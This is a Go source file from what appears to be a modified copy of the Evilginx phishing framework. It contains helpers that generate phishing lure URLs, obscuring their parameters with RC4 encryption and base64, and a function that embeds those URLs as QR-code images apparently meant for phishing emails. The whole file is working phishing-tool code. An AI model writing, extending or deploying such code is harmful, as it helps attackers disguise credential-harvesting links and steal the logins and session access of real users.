package evilginx

import (
	"crypto/rc4"
	"encoding/base64"
	"math/rand"
	"net/url"
	"strings"
	qrcode "github.com/skip2/go-qrcode"
)

func GenRandomString(n int) string {
	const lb = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, n)
	for i := range b {
		t := make([]byte, 1)
		rand.Read(t)
		b[i] = lb[int(t[0])%len(lb)]
	}
	return string(b)
}

func GenRandomAlphanumString(n int) string {
	const lb = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		t := make([]byte, 1)
		rand.Read(t)
		b[i] = lb[int(t[0])%len(lb)]
	}
	return string(b)
}

/*
======= QR FUNCTION ============
*/

func makeQR(url string) string {
        var raw_png []byte
        raw_png, err := qrcode.Encode(url, qrcode.Medium, 256)
        raw_png_base64 := base64.StdEncoding.EncodeToString([]byte(raw_png))
        if err != nil {
                return ""
        }
        png_embeddable := "<img src=\"data:image/png;base64," + raw_png_base64 + "\" alt=\"Enable Images to view Scannable QR Code\">"
        return png_embeddable
}

/*
====================================
*/

func CreatePhishUrl(base_url string, params *url.Values) string {
	var ret string = base_url
	if len(*params) > 0 {
		key_arg := strings.ToLower(GenRandomString(rand.Intn(3) + 1))

		enc_key := GenRandomAlphanumString(8)
		dec_params := params.Encode()

		var crc byte
		for _, c := range dec_params {
			crc += byte(c)
		}

		c, _ := rc4.NewCipher([]byte(enc_key))
		enc_params := make([]byte, len(dec_params)+1)
		c.XORKeyStream(enc_params[1:], []byte(dec_params))
		enc_params[0] = crc

		key_val := enc_key + base64.RawURLEncoding.EncodeToString([]byte(enc_params))
		ret += "?" + key_arg + "=" + key_val
	}
	return ret
}
